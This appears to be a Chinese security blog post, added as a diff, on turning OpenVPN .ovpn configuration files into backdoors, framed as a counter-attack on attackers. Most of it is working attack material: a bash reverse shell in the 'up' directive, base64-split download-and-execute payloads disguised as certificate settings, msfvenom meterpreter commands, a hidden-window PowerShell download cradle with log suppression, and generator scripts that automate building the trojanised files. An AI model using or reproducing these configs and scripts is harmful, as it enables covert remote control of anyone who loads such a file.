@@ -1,0 +1,211 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>OpenVPN是企业常用的数据传输工具，然而使用不信任的ovpn文件是十分危险的，一旦被恶意利用可能会导致企业的数据信息泄露。本文由锦行科技的安全研究团队提供（作者：t43M!ne），介绍了攻击者是如何对OpenVPN的配置文件进行修改，构建出可连接到远程控制端的反制模块，从而实现对OpenVPN用户系统的控制管理，深入探讨“反制”行为。</p>
+<p><strong>简述</strong><br/>
+无意中看到一篇18年的老文，作者描述了一种利用OVPN文件（即OpenVpn的配置文件）创建一个反弹Shell的操作。核心在于官方声明的up命令，该命令常用于启用TUN后的指定路由。本质上相当于起了一个进程运行指向的任意脚本。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200914113809-b548ade0-f63b-1.png"/></p>
+<p>作者给出了linux下的POC</p>
+<div class="highlight"><pre><span></span>remote <span class="m">192</span>.168.1.245
+ifconfig <span class="m">10</span>.200.0.2 <span class="m">10</span>.200.0.1
+dev tun
+script-security <span class="m">2</span>
+up <span class="s2">"/bin/bash -c '/bin/bash -i &gt; /dev/tcp/192.168.1.218/8181 0&lt;&amp;1 2&gt;&amp;1&amp;'"</span>
+</pre></div>
+<p>并且探索了win上利用powershell弹shell的配置可行性</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200914114727-0246d9d6-f63d-1.png"/></p>
+<p>通过环境变量绕过up命令长度只能低于256的限制</p>
+<p>想要利用这样一个明显带有恶意命令的配置文件来反制具备安全意识的攻击者是比较难</p>
+<p><strong>优化</strong></p>
+<ul>
+<li>Ubuntu20 (自带Openvpn)</li>
+<li>win10 (OpenVpn Gui 2.4.9)<br/>
+[<a href="https://openvpn-gui.en.lo4d.com/windows" target="_blank">https://openvpn-gui.en.lo4d.com/windows</a>]</li>
+</ul>
+<p><strong>01 Linux</strong></p>
+<p>首先是Linux平台，测试可以直接用自带的openvpn加载配置</p>
+<div class="highlight"><pre><span></span>openvpn -config evil.config
+</pre></div>
+<p>既然win上可以用环境变量分割payload，显然linux上也可以这样做<br/>
+仿造botnet常用手段，将一条下载木马并执行的命令base64编码一下</p>
+<div class="highlight"><pre><span></span><span class="c1"># this is the part of the config file</span>
+setenv a1 <span class="s2">"Y3VybCBodHRwOi8vMTI3Lj"</span>
+setenv a2 <span class="s2">"AuMC4xL2EgLXMgLW8gL3Rt"</span>
+setenv a3 <span class="s2">"cC9hICYmIGNobW9kICt4IC"</span>
+setenv a4 <span class="s2">"90bXAvYSAmJiAvdG1wL2E="</span>
+up <span class="s2">"/bin/bash -c 'echo </span><span class="nv">$a1$a2$a3$a4</span><span class="s2">|base64 -d|bash'"</span>
+
+<span class="c1"># it will execute this command totaly </span>
+curl http://127.0.0.1/a -s -o /tmp/a <span class="o">&amp;&amp;</span> chmod +x /tmp/a <span class="o">&amp;&amp;</span> /tmp/a
+</pre></div>
+<p>但执行<code>/bin/bash</code>的特征没别的好办法去掉， 翻了一下官方样例配置文件，然后往里边添加了100多行配置代码和注释，并且混淆了切割的payload变量名，伪装成与证书相关的操作</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200914114829-26ac5882-f63d-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1"># generate</span>
+msfvenom -p linux/x86/meterpreter_reverse_https <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8080</span> -o a -f elf
+
+<span class="c1"># host the launcher pe</span>
+python3 -m http.server <span class="m">80</span>
+
+<span class="c1"># start to listen</span>
+msfconsole -r linux_listen.rc
+</pre></div>
+<p>msf正常上线， 此处应有图， 但并没有。</p>
+<p><strong>02 Win</strong></p>
+<p>本以为win的比较好做，毕竟原文已经给出了调用powershell的poc了，但...先看看原文的调用</p>
+<div class="highlight"><pre><span></span>up <span class="s1">'C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||'</span>
+</pre></div>
+<p>用的是三无作坊的ps脚本，命令太长了20多个变量才切割完，祭出msf</p>
+<div class="highlight"><pre><span></span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">6666</span> -f psh-reflection -o a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">6666</span> -f psh -o a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">6666</span> -f psh-net -o a.ps1
+</pre></div>
+<p>先后尝试了三种格式的，都不太稳定...只有初始包, meterpreter背锅</p>
+<div class="highlight"><pre><span></span>msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> -f base64
+</pre></div>
+<p>最后拿原始payload自己替换到cs的powershell模板中，将模板的异或解密去掉</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200914114931-4bbcdfd4-f63d-1.png"/></p>
+<div class="highlight"><pre><span></span>python3 -m http.server <span class="m">80</span> 
+
+<span class="c1"># start to listen </span>
+msfconsole -r win_listen.rc
+</pre></div>
+<p>加载时就只需要执行这一串就可以了</p>
+<div class="highlight"><pre><span></span>iex<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://127.0.0.1/a.ps1'</span><span class="o">)</span><span class="p">;</span>a.ps1
+</pre></div>
+<p>这样就成功将命令缩短到4段，再简化一下参数，<br/>
+将参数的指定方式<code>-</code>替换为<code>/</code>作下基本免杀，不然实在看不下眼了</p>
+<div class="highlight"><pre><span></span>setenv k0 xxx
+setenv k1 xxx
+setenv k2 xxx
+setenv k3 xxx
+up <span class="s1">'C:\\Windows\\System32\\cmd.exe /c "(start powershell /w hidden /enc %k0%%k1%%k2%%k3%)"'</span>
+</pre></div>
+<p>先拿去试了一试，可以成功执行，但hidden参数并不起作用，powershell的窗口一闪而过</p>
+<p>直接在cmd终端甚至webshell下通过cmd /c 调用的powershell时加上hidden参数是不应该有任何闪窗的</p>
+<p>然后意识到这里用了start来启一个进程，这与以下的命令虽然像，但效果可不同, 果然是调用方式问题</p>
+<div class="highlight"><pre><span></span>cmd.exe /c powershell /w hidden /enc %k0%%k1%%k2%%k3%
+</pre></div>
+<p>尝试将start去掉，这下好了?不, 这下崩了，虽然官方文档中说明了能使用单引号和双引号，反引号注明传递参数</p>
+<p>单在win上的gui中某些特定情况下,并没有将整串powershell命令当作参数导致解析失败</p>
+<p>而用start的方式调用会有闪窗..在一番乱查之后发现cmd还有一个<code>/b</code>参数可以解决这个万恶的闪窗</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200914115050-7b358252-f63d-1.png"/></p>
+<p>详细查看了一下错误日志,因为执行这一串命令后,返回的值跟openvpn预料的不符</p>
+<p>所以openvpn认为这是执行失败了,所以把进程kill掉,并中断一切操作...</p>
+<p>那就给它加个管道把输出丢了吧</p>
+<div class="highlight"><pre><span></span>up <span class="s1">'C:\\Windows\\System32\\cmd.exe /c "(start /min /b powershell /w hidden /enc encoded_shellcode)|cmd"'</span>
+</pre></div>
+<p>但这样还是太长了很显眼，既然是cmd然后再调用的powershell，我们其实有两次解析环境变量的机会，因此可以再嵌套一层变量</p>
+<div class="highlight"><pre><span></span>setenv kk <span class="s1">'start /min /b powershell /w hidden /enc %k0%%k1%%k2%%k3%'</span>
+up <span class="s1">'C:\\Windows\\System32\\cmd.exe /c "(%kk%)|cmd"'</span>
+</pre></div>
+<p>当然不要忘了把日志等级设置一下,不然debug信息就把命令输出到log了</p>
+<div class="highlight"><pre><span></span><span class="c1"># Set log file verbosity.</span>
+ verb <span class="m">0</span>
+</pre></div>
+<p>最终利用</p>
+<div class="highlight"><pre><span></span>msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> -f base64 
+
+<span class="c1"># 替换到powershell模板里,然后python3 -m http.server 80 </span>
+<span class="c1"># 将下载的url转为base64, 切割成四段, 隐藏到配置文件中...</span>
+</pre></div>
+<p>全手动啊?好麻烦啊, 这也叫武器化?</p>
+<p><strong>武器化</strong><br/>
+生成脚本它这就来</p>
+<p><strong>01 linux</strong><br/>
+linux平台配置文件生成脚本</p>
+<div class="highlight"><pre><span></span>import base64
+import random
+import argparse
+
+<span class="nv">template</span> <span class="o">=</span> <span class="s1">'''太长就不放了'''</span>
+
+def handle_tempalte<span class="o">(</span>p1,p2,p3,p4<span class="o">)</span>:
+    <span class="k">return</span> template.format<span class="o">(</span><span class="nv">first</span><span class="o">=</span><span class="s1">'setenv resolv "{}"'</span>.format<span class="o">(</span>p1<span class="o">)</span>,
+    <span class="nv">second</span><span class="o">=</span><span class="s1">'setenv key "{}"'</span>.format<span class="o">(</span>p2<span class="o">)</span>,
+    <span class="nv">thrid</span><span class="o">=</span><span class="s1">'setenv client_key "{}"'</span>.format<span class="o">(</span>p3<span class="o">)</span>,
+     <span class="nv">fourth</span><span class="o">=</span><span class="s1">'setenv cert "{}"'</span>.format<span class="o">(</span>p4<span class="o">))</span>
+
+def encode_payload<span class="o">(</span>url<span class="o">)</span>:
+  <span class="nv">file_str</span> <span class="o">=</span> <span class="s1">''</span>.join<span class="o">(</span>random.sample<span class="o">(</span><span class="s1">'zyxwvutsrqponmlkjihgfedcba'</span>,4<span class="o">))</span>
+    <span class="k">return</span> str<span class="o">(</span>base64.b64encode<span class="o">(</span>bytes<span class="o">(</span><span class="s2">"curl {url} -s -o /tmp/{file_str} &amp;&amp; chmod +x /tmp/{file_str} &amp;&amp; /tmp/{file_str}"</span>.format<span class="o">(</span><span class="nv">url</span><span class="o">=</span>url, <span class="nv">file_str</span><span class="o">=</span>file_str<span class="o">)</span>,encoding<span class="o">=</span><span class="s2">"utf-8"</span><span class="o">)))</span>.strip<span class="o">(</span><span class="s2">"b'"</span><span class="o">)</span>
+
+<span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span>:
+    <span class="nv">parser</span> <span class="o">=</span> argparse.ArgumentParser<span class="o">()</span>
+    parser.add_argument<span class="o">(</span><span class="s2">"url"</span>, <span class="nv">help</span><span class="o">=</span><span class="s2">"the url where to download your cat"</span><span class="o">)</span>
+    <span class="nv">args</span> <span class="o">=</span> parser.parse_args<span class="o">()</span>
+    <span class="nv">evil_code</span> <span class="o">=</span> encode_payload<span class="o">(</span>args.url<span class="o">)</span>
+    print<span class="o">(</span><span class="s2">"[+] evil_code: {}"</span>.format<span class="o">(</span>evil_code<span class="o">))</span>
+    <span class="nv">flag</span> <span class="o">=</span> int<span class="o">(</span>len<span class="o">(</span>evil_code<span class="o">)</span>/4<span class="o">)</span>
+    <span class="nv">file_content</span> <span class="o">=</span> handle_tempalte<span class="o">(</span>evil_code<span class="o">[</span>:flag<span class="o">]</span>, evil_code<span class="o">[</span>flag:2*flag<span class="o">]</span>, evil_code<span class="o">[</span><span class="m">2</span>*flag:3*flag<span class="o">]</span>,evil_code<span class="o">[</span><span class="m">3</span>*flag:<span class="o">])</span>
+    with open<span class="o">(</span><span class="s2">"evil.config"</span>, <span class="s2">"w"</span><span class="o">)</span> as f:
+        f.write<span class="o">(</span>file_content<span class="o">)</span>
+    print<span class="o">(</span><span class="s1">'[*] Done! Maybe you should: msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf'</span><span class="o">)</span>
+</pre></div>
+<p><strong>02 Win</strong><br/>
+powershell中/enc参数所需的base64编码是unicode的....无奈只能拿powershell写了</p>
+<div class="highlight"><pre><span></span>Set-StrictMode -Version <span class="m">2</span>
+
+<span class="nv">$powershell_template</span> <span class="o">=</span> @<span class="s1">'太长就不放了'</span>@
+<span class="nv">$tempalte</span> <span class="o">=</span> @<span class="s1">'太长就不放了'</span>@
+<span class="k">function</span> handle_tempalte <span class="o">{</span>
+ Param <span class="o">(</span><span class="nv">$first</span>, <span class="nv">$second</span>, <span class="nv">$thrid</span>, <span class="nv">$fourth</span><span class="o">)</span>
+    <span class="nv">$tempalte</span> <span class="o">=</span> <span class="nv">$tempalte</span>.Replace<span class="o">(</span><span class="s1">'{first}'</span>,<span class="nv">$first</span><span class="o">)</span>
+    <span class="nv">$tempalte</span> <span class="o">=</span> <span class="nv">$tempalte</span>.Replace<span class="o">(</span><span class="s1">'{second}'</span>,<span class="nv">$second</span><span class="o">)</span>
+    <span class="nv">$tempalte</span> <span class="o">=</span> <span class="nv">$tempalte</span>.Replace<span class="o">(</span><span class="s1">'{thrid}'</span>,<span class="nv">$thrid</span><span class="o">)</span>
+    <span class="k">return</span> <span class="nv">$tempalte</span>.Replace<span class="o">(</span><span class="s1">'{fourth}'</span>,<span class="nv">$fourth</span><span class="o">)</span>
+<span class="o">}</span>
+
+<span class="k">function</span> handle_pstempalte <span class="o">{</span>
+ Param <span class="o">(</span><span class="nv">$shellcode</span><span class="o">)</span>
+<span class="k">return</span> <span class="nv">$powershell_template</span>.Replace<span class="o">(</span><span class="s1">'%DATA%'</span>,<span class="nv">$shellcode</span><span class="o">)</span>
+<span class="o">}</span>
+
+<span class="nv">$url</span> <span class="o">=</span> Read-Host <span class="s2">"Please enter your download url, Ex: http://192.168.114.165/a.ps1 :"</span>
+<span class="nv">$file</span> <span class="o">=</span> Read-Host <span class="s2">"Please enter your script name, Ex: a.ps1 :"</span>
+<span class="nv">$raw_payload</span> <span class="o">=</span> <span class="s2">"iex(New-Object Net.WebClient).DownloadString('{url}');{file}"</span>.Replace<span class="o">(</span><span class="s1">'{url}'</span>,<span class="nv">$url</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s1">'{file}'</span>,<span class="nv">$file</span><span class="o">)</span>
+Write-Host <span class="nv">$raw_payload</span>
+<span class="nv">$b64_payload</span> <span class="o">=</span> <span class="o">[</span>convert<span class="o">]</span>::tobase64string<span class="o">([</span>system.text.encoding<span class="o">]</span>::unicode.getbytes<span class="o">(</span><span class="nv">$raw_payload</span><span class="o">))</span>
+<span class="c1"># split payload</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="nv">$b64_payload</span>.length/4
+<span class="nv">$evil_ovpn</span> <span class="o">=</span> handle_tempalte <span class="nv">$b64_payload</span>.Substring<span class="o">(</span><span class="m">0</span>,55<span class="o">)</span>.Insert<span class="o">(</span><span class="m">0</span>,<span class="s2">"setenv k0 "</span><span class="o">)</span> <span class="nv">$b64_payload</span>.Substring<span class="o">(</span><span class="nv">$flag</span>,<span class="nv">$flag</span><span class="o">)</span>.Insert<span class="o">(</span><span class="m">0</span>,<span class="s2">"setenv k1 "</span><span class="o">)</span> <span class="nv">$b64_payload</span>.Substring<span class="o">(</span><span class="nv">$flag</span>*2,<span class="nv">$flag</span><span class="o">)</span>.Insert<span class="o">(</span><span class="m">0</span>,<span class="s2">"setenv k2 "</span><span class="o">)</span> <span class="nv">$b64_payload</span>.Substring<span class="o">(</span><span class="nv">$flag</span>*3,<span class="nv">$flag</span><span class="o">)</span>.Insert<span class="o">(</span><span class="m">0</span>,<span class="s2">"setenv k3 "</span><span class="o">)</span>
+Out-File -FilePath .<span class="se">\e</span>vil.ovpn -InputObject <span class="nv">$evil_ovpn</span> -Encoding utf8
+Write-Host <span class="s2">"generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64"</span>
+<span class="nv">$shellcode</span> <span class="o">=</span> Read-Host <span class="s2">"Please enter your shellcode :"</span>
+<span class="nv">$evil_ps</span> <span class="o">=</span> handle_pstempalte <span class="nv">$shellcode</span>
+Out-File -FilePath .<span class="se">\e</span>vil.ps1 -InputObject <span class="nv">$evil_ps</span> -Encoding utf8
+</pre></div>
+<p><strong>Usage</strong></p>
+<p><strong>01 Linux</strong></p>
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/meterpreter_reverse_https <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8080</span> -o a -f elf
+
+python3 generate_linux.py http://192.168.114.165/a
+
+ <span class="c1"># host the launcher pe</span>
+python3 -m http.server <span class="m">80</span>
+
+<span class="c1"># start to listen</span>
+msfconsole -r linux_listen.rc
+
+<span class="c1"># attacker use the evil config file</span>
+sudo openvpn --config evil.ovpn
+</pre></div>
+<p><strong>02 Win</strong></p>
+<div class="highlight"><pre><span></span>msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> -f base64
+
+powershell -ep bypass -f generate_win.ps1
+&gt; Please enter your download url, Ex: http://192.168.114.165/a.ps1 :: http://192.168.114.165/a.ps1
+&gt; Please enter your script name, Ex: a.ps1 :: a.ps1
+&gt; iex<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://192.168.114.165/a.ps1'</span><span class="o">)</span><span class="p">;</span>a.ps1
+&gt; generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span><span class="m">192</span>.168.114.165 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> -f base64
+&gt; Please enter your shellcode :: shellcode
+&gt; <span class="o">[</span>*<span class="o">]</span> Done! Host your evil.ps1 by <span class="s1">'python3 -m http.server 80'</span> on your vps
+&gt; <span class="o">[</span>+<span class="o">]</span> please look at evil.ovpn, and show me your SET skill
+
+<span class="c1"># host the launcher pe</span>
+python3 -m http.server <span class="m">80</span>
+
+<span class="c1"># start to listen</span>
+msfconsole -r win_listen.rc
+</pre></div>
+<p>References<br/>
+文章：Reverse Shell from an OpenVPN Configuration File<br/>
+链接地址：<a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a></p>
+</div>
+</div>
